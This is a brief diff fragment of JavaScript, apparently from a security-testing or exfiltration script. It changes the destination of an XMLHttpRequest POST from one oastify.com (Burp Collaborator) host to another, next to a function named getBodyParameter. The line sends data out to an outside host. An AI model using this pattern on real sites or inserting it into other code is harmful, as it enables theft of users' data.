@@ -39,7 +39,7 @@ function getBodyParameter(parameterName) {
 var xhr = new XMLHttpRequest();
 
 // Set up the request
-xhr.open('POST', 'https://z8800o8b8ywlpg8uh7zz7dzvgmmjaady2.oastify.com', true);
+xhr.open('POST', 'https://vonf409o151opdnhqaxz79goafg740sp.oastify.com', true);
 xhr.setRequestHeader('Content-Type', 'application/json');
 
 // Define the callback function for when the request completes
